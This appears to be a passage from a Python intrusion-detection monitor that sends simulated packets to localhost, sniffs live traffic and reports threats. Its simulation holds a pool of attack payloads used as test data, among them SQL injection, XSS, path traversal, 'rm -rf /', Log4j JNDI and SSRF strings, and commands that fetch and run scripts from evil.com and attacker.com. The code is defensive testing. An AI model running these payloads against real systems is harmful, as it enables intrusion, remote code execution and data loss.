        if is_threat:
            enricher.queue_threat(event_id, {
                "source": src_ip,
                "ports": str(list(flow["ports"])),
                "method": method,
                "confidence": confidence,
                "intel": intel,
            })

    def _generate_mock_packet(self, src_ip, src_port, dst_ip, dst_port, payload=b""):
        from scapy.all import IP, TCP, Raw
        packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port)
        if payload:
            packet = packet / Raw(load=payload)
        return packet

    def run_simulation(self, interval=0.3):
        print("[Monitor] Running continuous simulation mode. Press CTRL+C to stop.")
        log.info("Simulation mode started", extra={"interval": interval})
        self.running = True

        # Industry-realistic attack payload pool
        attack_payloads = [
            b"cat /etc/passwd",
            b"' OR 1=1 --",
            b"UNION SELECT username, password FROM users --",
            b"<script>document.cookie</script>",
            b"<img onerror=alert(1) src=x>",
            b"cmd.exe /c whoami",
            b"/bin/sh -c 'wget http://evil.com/shell.sh'",
            b"system('rm -rf /')",
            b"eval(base64_decode('bWFsaWNpb3Vz'))",
            b"../../etc/shadow",
            b"..\\..\\windows\\system32\\config\\SAM",
            b"javascript:alert(document.domain)",
            b"SELECT * FROM information_schema.tables",
            b"curl http://attacker.com/backdoor.sh | bash",
            b"chmod 777 /tmp/exploit",
            b"DROP TABLE users;",
            b"boot.ini",
            b"%2e%2e%2f%2e%2e%2fetc/passwd",
            b"Y2F0IC9ldGMvcGFzc3dk",  # base64 for 'cat /etc/passwd'
            b"PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=",  # base64 for '<script>alert(1);</script>'
            b"${jndi:ldap://evil.com/a}",  # Log4j JNDI Exploitation
            b"http://169.254.169.254/latest/meta-data/",  # SSRF
            b"file:///etc/passwd",  # SSRF
            b"{\"username\": {\"$gt\": \"\"}}",  # NoSQL Injection
            b"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",  # XXE
            b"eval(base64_decode('Q1JJU0lT'))",  # PHP Obfuscation
        ]
        benign_payloads = [
            b"normal status update",
            b"GET /index.html HTTP/1.1",
            b"POST /api/login HTTP/1.1",
            b"heartbeat ping",
            b"",
        ]

        try:
            # Massive IP pool (500+ IPs) to prevent exhaustion
            source_pool = (
                [f"10.0.0.{i}" for i in range(1, 255)] +
                [f"172.16.0.{i}" for i in range(1, 255)]
            )
            port_pool = [80, 443, 22, 3389, 143, 2144, 4343, 8080, 53, 3306, 5432, 25, 110, 993, 995]
            reset_threshold = 100  # Reset blocked IPs every N events to keep data flowing

            sim_loop_count = 0
            while self.running:
                sim_loop_count += 1
                # AUTO-RESET: Clear blocked IPs periodically so data NEVER stops
                # Note: In production, use TTL-based expiry from firewall.py instead
                if len(self.firewall.blocked_ips) >= cfg.MAX_BLOCKED_IPS or (sim_loop_count > 0 and sim_loop_count % reset_threshold == 0):
                    self.firewall.blocked_ips.clear()
                    self.firewall.blocked_cidrs.clear()
                    self._flow_tracker.clear()
                    self.feature_extractor = get_extractor()  # Reset flow tracking too

                source_ip = random.choice(source_pool)
                source_port = random.randint(1024, 65535)
                dst_ip = "127.0.0.1"
                dst_port = random.choice(port_pool)

                # 15% chance of attack payload, 10% benign payload, 75% no payload
                roll = random.random()
                if roll < 0.05:
                    # UEBA Lateral Movement Simulation (Port Scan Burst)
                    for _ in range(12):
                        burst_port = random.choice(port_pool)
                        pkt = self._generate_mock_packet(source_ip, source_port, dst_ip, burst_port, b"")
                        self.process_packet(pkt)
                    payload = random.choice(attack_payloads)
                elif roll < 0.15:
                    payload = random.choice(attack_payloads)
                elif roll < 0.25:
                    payload = random.choice(benign_payloads)
                else:
                    payload = b""

                packet = self._generate_mock_packet(source_ip, source_port, dst_ip, dst_port, payload)
                try:
                    self.process_packet(packet)
                except Exception as e:
                    log.error(f"Simulation packet error: {e}")

                # Fix: skip heartbeat when event_count==0
                if self.event_count > 0 and self.event_count % self.heartbeat_period == 0:
                    log.info(
                        "Heartbeat",
                        extra={
                            "event_count": self.event_count,
                            "active_flows": len(self._flow_tracker),
                            "blocked_ips": len(self.firewall.blocked_ips),
                            "logger_metrics": self.logger.get_metrics(),
                        }
                    )
                    print(f"[Monitor] Heartbeat: event_count={self.event_count}, active_flows={len(self._flow_tracker)}, blocked_ips={len(self.firewall.blocked_ips)}")
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[Monitor] Simulation stopped by user. Generating Security Report...")
            self.reporter.generate_report()
            import os
            os._exit(0)
        finally:
            self.running = False

    def _zmq_subscriber_worker(self):
        from scapy.all import IP, Ether
        print(f"{RED}[AI Node] Waiting for packet telemetry from Edge node on port 5555...{RESET}")
        while self.running:
            try:
                # Use polling to allow graceful shutdown
                if self.zmq_socket.poll(1000):
                    raw_bytes = self.zmq_socket.recv()
                    # Try to reconstruct as IP (since mock generator sends IP layer)
                    packet = IP(raw_bytes)
                    self.executor.submit(self._process_packet_task, packet)
            except Exception as e:
                log.error(f"ZMQ subscriber error: {e}")
                time.sleep(1)

    def start(self):
        print(f"[Monitor] Starting continuous non-stop stealth detection...")
        log.info("Monitor starting", extra={"mode": "simulation" if self.simulate_mode else "live", "version": cfg.VERSION})
        self.running = True
        try:
            if self.node_type == "ai":
                self._zmq_subscriber_worker()
            elif self.simulate_mode:
                self.run_simulation(interval=0.005)  # Speeds up output to 200 packets/sec
            else:
                sniff(iface=self.interface, prn=self.process_packet, store=0)
        except KeyboardInterrupt:
            print("\n[Monitor] Stopped by user. Generating Security Report...")
            self.reporter.generate_report()
            import os
            os._exit(0)
        except Exception as e:
            log.error(f"Sniffing Error: {e}")
            print(f"\n[Monitor] Sniffing Error: {e}")
            print("[Monitor] Falling back to continuous simulation mode.")
            self.run_simulation(interval=0.005)  # Speeds up output to 200 packets/sec
        finally:
            self.running = False


if __name__ == "__main__":
    import os
    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            STD_INPUT_HANDLE = -10
            ENABLE_QUICK_EDIT_MODE = 0x0040
            ENABLE_EXTENDED_FLAGS = 0x0080
            handle = kernel32.GetStdHandle(STD_INPUT_HANDLE)
            mode = ctypes.c_uint32()
            kernel32.GetConsoleMode(handle, ctypes.byref(mode))
            mode.value &= ~ENABLE_QUICK_EDIT_MODE
            mode.value |= ENABLE_EXTENDED_FLAGS
            kernel32.SetConsoleMode(handle, mode)
        except Exception:
            pass

    import argparse
    parser = argparse.ArgumentParser(description="STEALTH RECONNAISSANCE DETECTION v2.0")
    parser.add_argument("--simulate", action="store_true", help="Run simulation first")
    parser.add_argument("--node", choices=["standalone", "edge", "ai"], default="standalone", help="Distributed architecture mode")
    args = parser.parse_args()

    monitor = StealthMonitor(node_type=args.node)

    if args.simulate:
        monitor.simulate_mode = True
        print(f"{RED}--- STARTING CONTINUOUS SIMULATION MODE ---{RESET}")

    monitor.start()
